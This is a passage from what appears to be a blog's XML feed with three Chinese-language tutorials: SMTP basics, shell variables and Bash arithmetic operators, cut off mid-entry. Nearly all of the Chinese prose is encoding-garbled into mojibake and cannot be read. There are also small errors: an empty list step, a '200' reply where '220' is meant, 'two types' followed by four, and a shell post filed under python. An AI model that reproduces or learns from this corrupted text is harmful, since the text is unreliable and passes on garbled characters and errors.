        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>æœ¬æ–‡å°†è¯¦ç»†è®²è¿° SMTP çš„åŸºç¡€çŸ¥è¯†ï¼Œå¹¶å‘ä½ å±•ç¤º SMTP å®¢æˆ·ç«¯ä¸ SMTPæœåŠ¡ç«¯ä¹‹é—´çš„é€šä¿¡è¿‡ç¨‹ï¼Œæœ€åï¼Œé€šè¿‡ä½¿ç”¨ç»ˆç«¯å½“ä½œ SMTPå®¢æˆ·ç«¯ï¼Œé€šè¿‡å‘½ä»¤è¡Œçš„æ–¹å¼ç›´æ¥å‘ QQ é‚®ç®±å‘é€ä¸€å°é‚®ä»¶ã€‚</p><p>å¦‚æœä½ é…ç½®è¿‡é‚®ä»¶å®¢æˆ·ç«¯çš„è¯ï¼Œä½ åº”è¯¥äº†è§£ IMAP, POP å’Œ SMTPã€‚ IMAP å’ŒPOP æ˜¯ç”¨æ¥ä»é‚®ç®±å–å›é‚®ä»¶çš„ï¼Œè€Œ SMTP æ˜¯ç”¨æ¥å‘é€é‚®ä»¶çš„ã€‚å…³äº IMAP å’Œ POPåè®®ï¼Œæœªæ¥æˆ‘ä¼šåœ¨å¦ä¸€ç¯‡æ–‡ç« ä¸­è®²è¿°ã€‚</p><p>SMTPï¼ˆSimple Mail TransferProtocolï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥åœ¨äº’è”ç½‘ä¸Šé«˜æ•ˆå¯é ä¼ è¾“é‚®ä»¶çš„æ ‡å‡†åè®®ã€‚å®ƒæ˜¯ä¸€ä¸ªé¢å‘è¿æ¥çš„ï¼ŒåŸºäºæ–‡æœ¬çš„åè®®ã€‚å®ƒæ˜¯åŸºäºTCP/IP åè®®çš„åº”ç”¨å±‚åè®®ï¼Œé€šå¸¸è¿è¡Œåœ¨ 25 ç«¯å£ã€‚ç†è®ºä¸Šæ¥è®²ï¼ŒSMTP å¯ä»¥è¢«TCP, UDPï¼Œç”šè‡³ä¸€äº›ä¸‰æ–¹åè®®å¤„ç†ã€‚RFC å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p>SMTP is independent of the particular transmission subsystem andrequires only a reliable ordered data stream channel.</p></blockquote><p>æ­¤å¤–ï¼Œäº’è”ç½‘ç¼–å·åˆ†é…æœºæ„ï¼ˆIANAï¼ŒInternet Assigned NumbersAuthorityï¼‰å°† TCP å’Œ UDP çš„ 25 ç«¯å£éƒ½åˆ†é…ç»™äº† SMTP,ä»¥ä¾¿ä½¿ç”¨ã€‚ç„¶è€Œï¼Œåœ¨å®é™…ä¸­ï¼Œå¤§å¤šæ•°ç»„ç»‡å’Œåº”ç”¨ä»…é€‰æ‹©å®ç° TCP åè®®ã€‚</p><p>å®ƒé‡‡ç”¨ â€œå­˜å‚¨è½¬å‘â€çš„æ–¹å¼æ¥åè°ƒä¸åŒç½‘ç»œä¹‹é—´çš„é‚®ä»¶å‘é€è¿‡ç¨‹ã€‚åœ¨ SMTPåè®®ä¸­ï¼Œæœ‰ä¸€ç§æ›´å°çš„è½¯ä»¶æœåŠ¡ï¼Œå«åš Mail Transfer Agents (MTA,é‚®ä»¶ä¼ è¾“ä»£ç†)ã€‚å®ƒå¸®åŠ©ç®¡ç†é‚®ä»¶çš„ä¼ è¾“å’Œæœ€åå‘æ¥æ”¶æ–¹é‚®ç®±çš„é€’é€ç¯èŠ‚ã€‚SMTPä¸ä»…å®šä¹‰äº†æ•´ä¸ªé€šä¿¡æµï¼Œå®ƒè¿˜å¯ä»¥æ”¯æŒå‘é€æ–¹ç«™ç‚¹ã€æ¥æ”¶æ–¹ç«™ç‚¹æˆ–ä»»ä½•ä¸­ç»§æœåŠ¡å™¨ä¸Šç”µå­é‚®ä»¶çš„å»¶è¿Ÿå‘é€ã€‚</p><p>SMTP å®šä¹‰äº†ä¸€ç§é€šä¿¡åè®®ï¼Œå…¶è§„å®šäº†ä¸€å°é‚®ä»¶å¦‚ä½•ä»ä½ çš„ç”µè„‘çš„ MTAåˆ°è¾¾ç›®çš„ SMTP æœåŠ¡å™¨çš„ MTAï¼ˆå…¶ä¸­å¯èƒ½è·¨è¶Šå¤šä¸ªç½‘ç»œï¼‰ã€‚</p><h2 id="terminology">Terminology</h2><blockquote><p><strong>User Agent (UA)</strong>:ç”¨æ¥å‘é€å’Œæ¥æ”¶ç”µå­é‚®ä»¶çš„åº”ç”¨(Outlook, Mozilla Thunderbird, QQé‚®ç®±ï¼ŒGmail etc.)</p><p><strong>Mail Transfer Agent / Message Transfer Agent (MTA)</strong>:ä¸€ä¸ªè¿è¡Œåœ¨ SMT PæœåŠ¡å™¨ä¸Šçš„çš„è¿›ç¨‹ï¼Œå®ƒå°†ç”µå­é‚®ä»¶è½¬å‘ç»™æ­£ç¡®çš„æ”¶ä»¶äººï¼Œå¹¶ç®¡ç†å‘é€åˆ°ç”¨æˆ·é‚®ç®±çš„ç”µå­é‚®ä»¶ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œ MTAsç»´æŠ¤ä¸€ä¸ªä¸€ä¸ªé‚®ä»¶é˜Ÿåˆ—ï¼Œä»¥ä¾¿å½“è¿œç¨‹æœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼Œå¯ä»¥å®‰æ’é‡å¤äº¤ä»˜å°è¯•ã€‚MTAé€šå¸¸åŒ…å«ä¸€ä¸ªä¸“é—¨çš„è½¯ä»¶ç§°ä¸º<strong>mail delivery agent</strong> æˆ–<strong>message delivery agent(MDA)</strong>ã€‚å®ƒè´Ÿè´£å°†ç”µå­é‚®ä»¶ä¼ é€’åˆ°æœ¬åœ°æ”¶ä»¶äººçš„é‚®ç®±ï¼Œè€Œ MTA æ›´å…³æ³¨äºSMTP æœåŠ¡å™¨ä¹‹é—´çš„é‚®ä»¶è½¬å‘ã€‚</p></blockquote><h2 id="principle">Principle</h2><p>å½“ä¸€ä¸ªç”¨æˆ·é€šè¿‡ç”¨æˆ·ä»£ç†ï¼ˆä¾‹å¦‚ï¼šThunderbirdï¼‰å‘é€é‚®ä»¶æ—¶ï¼Œ å®¢æˆ·ç«¯ SMTPè¿›ç¨‹æ‰“å¼€ä¸€ä¸ªä¸åœ¨æœåŠ¡å™¨ï¼ˆä¾‹å¦‚: smtp.gmail.comï¼‰çš„ç«¯å£ 25 ä¸Šè¿è¡Œçš„ SMTPè¿›ç¨‹çš„ TCP è¿æ¥ã€‚åœ¨æœ€åˆçš„æ¡æ‰‹ä¹‹åï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ SMTPè¿›ç¨‹è¿›è¡Œç®€çŸ­çš„è¯·æ±‚-å“åº”å¯¹è¯ï¼Œä»¥ä¾¿å‘é€ç”µå­é‚®ä»¶</p><h2 id="åå¯¹">åå¯¹</h2><p>SMTP æ˜¯æ„å»ºåœ¨ç«¯åˆ°ç«¯æŠ¥æ–‡çš„ä¼ é€’ä¹‹ä¸Šã€‚</p><ol type="1"><li>é¦–å…ˆï¼ŒSMTP å®¢æˆ·ç«¯é€šè¿‡ç›®æ ‡ä¸»æœºçš„ SMTP æœåŠ¡ç«¯çš„ 25ç«¯å£ä¸å…¶è”ç³»ã€‚ç³»ç»Ÿç­‰å¾… <code>220 READY FOR MAIL</code> æ¶ˆæ¯æŠ¥æ–‡</li><li>ä¸€æ—¦æ”¶åˆ° 200 æŠ¥æ–‡ï¼Œå®¢æˆ·ç«¯å‘é€ <code>HELO</code> å‘½ä»¤</li><li>æœåŠ¡ç«¯è¿”å›æŠ¥æ–‡ï¼š<code>250 Requested Mail Action OK</code></li><li></li></ol><h2 id="references">References</h2><blockquote><ol type="1"><li><ahref="https://medium.com/team-rover/simple-mail-transfer-protocol-f55df5e2aebd">SIMPLEMAIL TRANSFER PROTOCOL</a></li><li><ahref="https://medium.com/@aryamansharda/how-email-actually-gets-sent-e1b2402b3a26">HowEmail Actually Gets Sent: A Look At SMTP</a></li><li><ahref="https://stackoverflow.com/questions/16809214/is-smtp-based-on-tcp-or-udp">IsSMTP based on TCP or UDP?</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> smtp </tag>
            
            <tag> mail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell å˜é‡</title>
      <link href="/blog/2020/09/02/programming/shell/4.varibles/"/>
      <url>/blog/2020/09/02/programming/shell/4.varibles/</url>
      
        <content type="html"><![CDATA[<p>shell ç¼–ç¨‹è®¾è®¡åˆ°çš„å˜é‡ä¸»è¦ä¸ºä¸¤ç§ç±»å‹ï¼šç¯å¢ƒå˜é‡ã€ä½ç½®å˜é‡ã€ç”¨æˆ·å®šä¹‰å˜é‡ã€é¢„å®šä¹‰å˜é‡ã€‚</p><ol type="1"><li><p>ç¯å¢ƒå˜é‡ï¼šå˜é‡ä¸­ä¿å­˜çš„æ˜¯å’Œç³»ç»Ÿæ“ä½œç¯å¢ƒç›¸å…³çš„æ•°æ®ã€‚ï¼ˆå€¼æ— æ³•æ›´æ”¹ï¼Œå¯ä»¥æ–°å»ºï¼‰</p><p>ç¯å¢ƒå˜é‡ä¼šåœ¨å½“å‰ shell å’Œè¿™ä¸ª shell çš„æ‰€æœ‰å­ shellå½“ä¸­ç”Ÿæ•ˆï¼Œå¦‚æœæŠŠç¯å¢ƒå˜é‡å†™å…¥ç›¸åº”çš„é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªç¯å¢ƒå˜é‡å°±ä¼šåœ¨æ‰€æœ‰çš„shell ä¸­ç”Ÿæ•ˆã€‚</p></li><li><p>ä½ç½®å‚æ•°å˜é‡ï¼šç”¨æ¥å‘è„šæœ¬å½“ä¸­ä¼ é€’å‚æ•°æˆ–æ•°æ®ï¼Œå˜é‡åä¸èƒ½è‡ªå®šä¹‰ï¼Œå˜é‡ä½œç”¨æ˜¯å›ºå®šçš„ã€‚ï¼ˆåç§°ä¸èƒ½è‡ªå®šä¹‰ï¼Œä¸èƒ½æ–°å»ºï¼Œåªèƒ½æ”¹å€¼ï¼‰</p></li><li><p>ç”¨æˆ·è‡ªå®šä¹‰å˜é‡ï¼ˆä¹Ÿå«æœ¬åœ°å˜é‡ï¼‰ï¼šåªåœ¨å½“å‰çš„ shellä¸­ç”Ÿæ•ˆã€‚</p></li><li><p>é¢„å®šä¹‰å˜é‡ï¼šBashä¸­å·²ç»å®šä¹‰å¥½çš„å˜é‡ï¼Œå˜é‡åä¸èƒ½è‡ªå®šä¹‰ï¼Œå˜é‡ä½œç”¨ä¹Ÿæ˜¯å›ºå®šçš„ã€‚ï¼ˆåç§°ä¸èƒ½è‡ªå®šä¹‰ï¼Œä¸èƒ½æ–°å»ºï¼Œåªèƒ½æ”¹å€¼ï¼‰</p></li></ol><h2 id="ç¯å¢ƒå˜é‡">ç¯å¢ƒå˜é‡</h2><p>shellç»´æŠ¤ç€ä¸€ç»„ç¯å¢ƒå˜é‡ï¼Œç”¨æ¥è®°å½•ç‰¹å®šçš„ç³»ç»Ÿä¿¡æ¯ã€‚æ¯”å¦‚ç³»ç»Ÿçš„åç§°ã€ç™»å½•åˆ°ç³»ç»Ÿä¸Šçš„ç”¨æˆ·åã€ç”¨æˆ·çš„ç³»ç»Ÿ IDï¼ˆä¹Ÿç§°ä¸º UIDï¼‰ã€ç”¨æˆ·çš„é»˜è®¤ä¸»ç›®å½•ä»¥åŠ shellæŸ¥æ‰¾ç¨‹åºçš„æœç´¢è·¯å¾„ã€‚å¯ä»¥ç”¨ setå‘½ä»¤æ¥æ˜¾ç¤ºä¸€ä»½å®Œæ•´çš„å½“å‰ç¯å¢ƒå˜é‡åˆ—è¡¨ã€‚</p><p>å¸¸è§çš„æ¯”å¦‚ï¼š<code>SHELLï¼ŒUIDï¼ŒUSER,USERNAMEï¼ŒQT_IM_MODULEï¼Œ0ï¼ŒBROWSERï¼ŒEDITOR</code></p><ol type="1"><li><p>åœ¨è„šæœ¬ä¸­ï¼Œä½ å¯ä»¥åœ¨ç¯å¢ƒå˜é‡åç§°ä¹‹å‰åŠ ä¸Šç¾å…ƒç¬¦ï¼ˆ<code>$</code>ï¼‰æ¥ä½¿ç”¨è¿™äº›ç¯å¢ƒå˜é‡ï¼Œå¦‚ï¼š</p><p><code>echo "User info for userid: $USER"</code></p></li><li><p>æ‰§è¡Œ Shell è„šæœ¬æ—¶ï¼Œå¯ä»¥å‘è„šæœ¬ä¼ é€’å‚æ•°</p><p>è„šæœ¬å†…è·å–å‚æ•°çš„æ ¼å¼ä¸ºï¼š<code>$n</code>ã€‚n ä»£è¡¨ä¸€ä¸ªæ•°å­—ï¼Œ1ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p></li><li><p>æ­£å› ä¸ºç¬¬ä¸€æ¡ï¼Œå‡ºç°äº†ä¸¤ä¸ªé—®é¢˜ã€‚</p><ol type="1"><li><p>åªè¦è„šæœ¬åœ¨å¼•å·ä¸­å‡ºç°ç¾å…ƒç¬¦ï¼Œå®ƒå°±ä¼šä»¥ä¸ºä½ åœ¨å¼•ç”¨ä¸€ä¸ªå˜é‡ã€‚</p><p>å¦‚æœä½ åªæƒ³æƒ³æ‰“å° <code>$30</code> çš„çº¯æ–‡æœ¬ï¼Œé‚£ä½ éœ€è¦ä½¿ç”¨åå¼•å·<code>\</code> å¯¹ <code>$</code> è¿›è¡Œè½¬ç§»</p></li><li><p>ç›´æ¥ <code>$</code> å¼•ç”¨å˜é‡åï¼Œå‡ºç°æ­§ä¹‰æ—¶ï¼Œé‡‡ç”¨<code>$&#123;&#125;</code></p><p>å› å½“ <code>echo $12</code> æ—¶ï¼Œ shellä¼šé¦–å…ˆå°†å¼•å·ä¸­çš„å˜é‡å½“ä½œç¯å¢ƒå˜é‡æˆ–è€…ä¼ é€’çš„å‚æ•°è§£é‡Šï¼Œå› æ­¤å¦‚æœä½ æƒ³è¦å¼•ç”¨<code>$12</code> å˜é‡ï¼Œè€Œä¸æ˜¯ <code>$1</code>2ï¼Œ é‚£å»ºè®®è¿™æ ·å†™<code>$&#123;12&#125;</code>.</p></li></ol></li></ol><h2 id="ä½ç½®å˜é‡">ä½ç½®å˜é‡</h2><p>ä½ç½®å‚æ•°å˜é‡</p><ol type="1"><li><p><code>$n</code> ï¼šn ä¸ºæ•°å­—ï¼Œ<code>$0</code>ä»£è¡¨å‘½ä»¤æœ¬èº«ï¼Œ<code>$1-$9</code>ä»£è¡¨ç¬¬ä¸€ä¸ªåˆ°ç¬¬ä¹ä¸ªå‚æ•°ï¼Œåä»¥ä¸Šçš„å‚æ•°éœ€è¦ç”¨å¤§æ‹¬å·åŒ…å«ï¼Œå¦‚<code>$&#123;10&#125; ã€$&#123;11&#125;</code></p></li><li><p><code>$*</code> ï¼šè¿™ä¸ªå˜é‡ä»£è¡¨å‘½ä»¤è¡Œä¸­æ‰€æœ‰çš„å‚æ•°ï¼Œ<code>$*</code>æŠŠæ‰€æœ‰çš„å‚æ•°çœ‹æˆä¸€ä¸ªæ•´ä½“ï¼ˆå¦‚æœå¾ªç¯ <code>$*</code>è¾“å‡ºå‚æ•°ï¼Œå°†åªè¾“å‡ºä¸€æ¬¡ï¼‰</p></li><li><p><code>$@</code> ï¼šè¿™ä¸ªå˜é‡ä¹Ÿä»£è¡¨å‘½ä»¤è¡Œä¸­æ‰€æœ‰çš„å‚æ•°ï¼Œä¸è¿‡<code>$@</code> æŠŠæ¯ä¸ªå‚æ•°åŒºåˆ†å¯¹å¾…ï¼ˆå¦‚æœå¾ªç¯ <code>$@</code>è¾“å‡ºå‚æ•°ï¼Œå°†å•ç‹¬è¾“å‡ºæ¯ä¸ªå‚æ•°ï¼‰</p></li><li><p><code>$#</code> ï¼šè¿™ä¸ªå˜é‡ä»£è¡¨å‘½ä»¤è¡Œä¸­æ‰€æœ‰å‚æ•°çš„ä¸ªæ•°</p></li></ol><h2 id="é¢„å®šä¹‰å˜é‡">é¢„å®šä¹‰å˜é‡</h2><ol type="1"><li><p><code>$?</code> é€€å‡ºç </p><p>shell ä¸­è¿è¡Œçš„æ¯ä¸ªå‘½ä»¤éƒ½ä½¿ç”¨é€€å‡ºçŠ¶æ€ç ï¼ˆexit statusï¼‰å‘Šè¯‰ shellå®ƒå·²ç»è¿è¡Œå®Œæ¯•ã€‚ Linux æä¾›äº†ä¸€ä¸ªä¸“é—¨çš„å˜é‡ <code>$?</code>æ¥ä¿å­˜ä¸Šä¸ªå·²æ‰§è¡Œå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç </p><p>Linux é”™è¯¯é€€å‡ºçŠ¶æ€ç æ²¡æœ‰ä»€ä¹ˆæ ‡å‡†å¯å¾ªï¼Œä½†æœ‰ä¸€äº›å¯ç”¨çš„å‚è€ƒï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200902170104.png"alt="exit code" /><figcaption aria-hidden="true">exit code</figcaption></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œshell è„šæœ¬ä¼šä»¥è„šæœ¬ä¸­çš„æœ€åä¸€ä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç é€€å‡ºã€‚exitå‘½ä»¤å…è®¸ä½ åœ¨è„šæœ¬ç»“æŸæ—¶æŒ‡å®šä¸€ä¸ªé€€å‡ºçŠ¶æ€ç ï¼Œä¾‹å¦‚ï¼š<code>exit 5</code>ã€‚ï¼ˆæ³¨æ„ï¼šé€€å‡ºçŠ¶æ€ç æœ€å¤§åªèƒ½æ˜¯255ï¼‰</p></li><li><p><code>$$</code> ï¼šå½“å‰è¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆPIDï¼‰</p></li><li><p><code>$!</code> ï¼šåå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å·ï¼ˆPIDï¼‰</p></li></ol><h2 id="ç”¨æˆ·å˜é‡">ç”¨æˆ·å˜é‡</h2><p>ç”¨æˆ·å˜é‡å¯ä»¥æ˜¯ä»»ä½•ç”±å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ç»„æˆçš„æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸è¶…è¿‡ 20ä¸ªã€‚<strong>ç”¨æˆ·å˜é‡åŒºåˆ†å¤§å°å†™</strong>ä½¿ç”¨ç­‰å·å°†å€¼èµ‹ç»™ç”¨æˆ·å˜é‡ã€‚åœ¨å˜é‡ã€ç­‰å·å’Œå€¼ä¹‹é—´<strong>ä¸èƒ½å‡ºç°ç©ºæ ¼</strong>ï¼ˆå¯¹ï¼Œä¸èƒ½å‡ºç°ç©ºæ ¼ï¼‰ã€‚</p><p>shell è„šæœ¬ä¼šè‡ªåŠ¨å†³å®šå˜é‡å€¼çš„æ•°æ®ç±»å‹ã€‚åœ¨è„šæœ¬çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸé‡Œï¼Œshellè„šæœ¬ä¸­å®šä¹‰çš„å˜é‡ä¼šä¸€ç›´ä¿æŒç€å®ƒä»¬çš„å€¼ï¼Œä½†åœ¨ shellè„šæœ¬ç»“æŸæ—¶ä¼šè¢«åˆ é™¤æ‰ã€‚</p><p>å¼•ç”¨ä¸€ä¸ªå˜é‡å€¼æ—¶éœ€è¦ä½¿ç”¨ç¾å…ƒç¬¦ï¼Œè€Œå¼•ç”¨å˜é‡æ¥<strong>å¯¹å…¶è¿›è¡Œèµ‹å€¼æ—¶åˆ™ä¸è¦ä½¿ç”¨ç¾å…ƒç¬¦</strong>ã€‚</p><p>å³ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">var1=1</span><br><span class="line">echo &quot;var1 = $var1&quot;</span><br><span class="line">var2=$var1</span><br><span class="line">echo &quot;var2 = $var2&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test.sh</span></span><br><span class="line">var1 = 1</span><br><span class="line">var2 = 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">your_name=<span class="string">&quot;qinjx&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$your_name</span></span></span><br><span class="line">qinjx</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://www.cnblogs.com/farwish/p/3923622.html">Bashå˜é‡ï¼šè‡ªå®šä¹‰å˜é‡ &amp; ç¯å¢ƒå˜é‡ &amp; ä½ç½®å‚æ•°å˜é‡ &amp;é¢„å®šä¹‰å˜é‡</a></li><li>Linux å‘½ä»¤è¡Œä¸ Shell è„šæœ¬ç¼–ç¨‹å¤§å…¨</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell æ•°å­¦è¿ç®—</title>
      <link href="/blog/2020/09/02/programming/shell/5.arithmetic_opt/"/>
      <url>/blog/2020/09/02/programming/shell/5.arithmetic_opt/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°å­¦è¿ç®—">æ•°å­¦è¿ç®—</h2><p>å¯¹ shell è„šæœ¬æ¥è¯´ï¼Œå¤„ç†è¿ç®—çš„è¿‡ç¨‹æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸” shellå¯¹æ•´æ•°å’Œæµ®ç‚¹æ•°çš„å¤„ç†æ–¹å¼ä¹Ÿä¸åŒï¼Œå› æ­¤ä¸‹é¢å°†æ•´æ•°å’Œæµ®ç‚¹æ“ä½œåˆ†å¼€è®²è¿°ã€‚</p><p>Bash æ”¯æŒä¸€ç³»åˆ—çš„ç®—æ•°è¿ç®—ï¼Œåˆ—è¡¨å¦‚ä¸‹ï¼Œå®ƒä»¬å¯ä»¥å·¥ä½œåœ¨ let, declare,ç®—æœ¯æ‰©å±•ï¼ˆarithmetic expansionï¼‰è¿™ä¸‰ç§æ–¹å¼ä¹‹ä¸‹ã€‚</p><table><colgroup><col style="width: 39%" /><col style="width: 41%" /><col style="width: 9%" /><col style="width: 9%" /></colgroup><thead><tr class="header"><th>Arithmetic Operator</th><th>Description</th><th></th><th></th></tr></thead><tbody><tr class="odd"><td>id++, id--</td><td>variable post-increment, post-decrement</td><td></td><td></td></tr><tr class="even"><td>++id, --id</td><td>variable pre-increment, pre-decrement</td><td></td><td></td></tr><tr class="odd"><td>-, +</td><td>unary minus, plus</td><td></td><td></td></tr><tr class="even"><td>!, ~</td><td>logical and bitwise negation</td><td></td><td></td></tr><tr class="odd"><td>**</td><td>exponentiation</td><td></td><td></td></tr><tr class="even"><td>*, /, %</td><td>multiplication, division, remainder (modulo)</td><td></td><td></td></tr><tr class="odd"><td>+, -</td><td>addition, subtraction</td><td></td><td></td></tr><tr class="even"><td>&lt;&lt;, &gt;&gt;</td><td>left and right bitwise shifts</td><td></td><td></td></tr><tr class="odd"><td>&lt;=, &gt;=, &lt;, &gt;</td><td>comparison</td><td></td><td></td></tr><tr class="even"><td>==, !=</td><td>equality, inequality</td><td></td><td></td></tr><tr class="odd"><td>&amp;</td><td>bitwise AND</td><td></td><td></td></tr><tr class="even"><td>^</td><td>bitwise XOR</td><td></td><td></td></tr><tr class="odd"><td></td><td></td><td>bitwise OR</td><td></td></tr><tr class="even"><td>&amp;&amp;</td><td>logical AND</td><td></td><td></td></tr><tr class="odd"><td></td><td></td><td></td><td>logical OR</td></tr><tr class="even"><td>expression ? expression : expression</td><td>conditional operator</td><td></td><td></td></tr><tr class="odd"><td>=, *=, /=, %=, +=, -=, &lt;&lt;=, &gt;&gt;=, &amp;=, ^=,</td><td>=</td><td>assignment</td><td></td></tr></tbody></table><h3 id="æ•´æ•°è¿ç®—"><strong>æ•´æ•°è¿ç®—</strong></h3><p><strong>æ¨èä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•è¿›è¡Œæ•´æ•°è¿ç®—</strong></p><ol type="1"><li><p>legacy wayï¼š expr</p><p>æœ€å¼€å§‹ï¼Œ Bourne shellæä¾›äº†å¤–ç½®çš„å‘½ä»¤è¡Œå·¥å…·<code>expr</code>æ¥åœ¨å‘½ä»¤è¡Œä¸Šå¤„ç†æ•´æ•°è¿ç®—ï¼Œä½†æ˜¯æ¯”è¾ƒç¬¨æ‹™ï¼Œæœ‰äº›è¿ç®—ç¬¦å·ä¸shellçš„å…ƒå­—ç¬¦å†²çªï¼Œéœ€è¦è½¬ä¹‰(ä¾‹å¦‚ï¼š<code>expr 1 \* 5</code>)ï¼Œè€Œä¸”è¿˜æœ‰æ ¼å¼è¦æ±‚ï¼Œå› æ­¤è™½ç„¶ç°åœ¨è¿™ä¸ªå‘½ä»¤è¿˜å­˜åœ¨ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸ç»å¸¸ä½¿ç”¨å®ƒäº†ã€‚</p><p>bash shell ä¸ºäº†ä¿æŒè·Ÿ Bourne shell çš„å…¼å®¹è€ŒåŒ…å«äº† exprå‘½ä»¤ï¼Œä½†å®ƒåŒæ ·ä¹Ÿæä¾›äº†ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•æ¥æ‰§è¡Œæ•°å­¦è¡¨è¾¾å¼ã€‚</p></li><li><p>shell builtin commandsï¼š<em>let</em> or <em>declare</em></p><ol type="1"><li><p><code>let</code> å‘½ä»¤è¿ç®—ç¬¦ä¸æ“ä½œæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:42]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var=2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:52]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">let</span> var+=3</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [15:23:56]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">let</span> x=4 y=5 z=x*y u=z/2</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>declare</code> è¿›è¡Œæ•´æ•°è¿ç®—è¿˜è¦å†™ <code>-i</code> é€‰é¡¹</p><blockquote><p>Integer Declaration using the declare -i notation can lead toconfusing or hard to read shell scripts.</p></blockquote><p>å®¹æ˜“æ··æ·†æˆ–è€…é™ä½ä»£ç å¯è¯»æ€§ï¼Œå› æ­¤æ”¾å¼ƒæ²»ç–—ã€‚</p></li></ol></li><li><p>(æ¨è) ç®—æ•°æ‰©å±•</p><p>åœ¨ Bash åŠæ›´é«˜çº§ shell ä¸­æ±‚æ•´æ•°ç®—æœ¯è¡¨è¾¾å¼çš„å€¼çš„æ¨èæ–¹æ³•æ˜¯ä½¿ç”¨ shellçš„ç®—æœ¯æ‰©å±•ï¼ˆarithmetic expressionsï¼‰ã€‚ å†…ç½®çš„ shell æ‰©å±•å…è®¸ä½ ä½¿ç”¨<code>((expression))</code>æ¥è¿›è¡Œæ•´æ•°è¿ç®—,æ”¯æŒä¸Šæ–‡çš„è¡¨æ ¼ä¸­çš„æ‰€æœ‰æ“ä½œç¬¦å·ã€‚</p><p>æ ¼å¼ï¼š<code>$((...))</code>,å…¶ä¸­è¿ç®—æ•°ï¼Œè¿ç®—ç¬¦å’Œæ‹¬å·ä¹‹é—´æœ‰æ— ç©ºæ ¼éƒ½å¯ï¼ˆèˆ’é€‚~ï¼‰ã€‚</p><p><code>$((...))</code> è¢«ç§°ä¸ºç®—æ•°æ‰©å±•ï¼ˆArithmetic Expansionï¼‰ï¼Œ<code>(())</code> è¢«ç§°ä¸ºå¤åˆå‘½ä»¤ï¼ˆcompound command ï¼‰ï¼Œåœ¨ bashä¸­ç”¨æ¥è®¡ç®—ä¸€ä¸ªç®—æ•°æ‰©å±•ã€‚</p><blockquote><p>æ³¨æ„ï¼š<code>$[...]</code> æ–¹æ‹¬å·ä¹Ÿèƒ½åœ¨ bashä¸­åšç®—æ•°æ‰©å±•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•è¢«å¼ƒç”¨äº†ï¼Œç›®å‰æ¨èä½¿ç”¨ 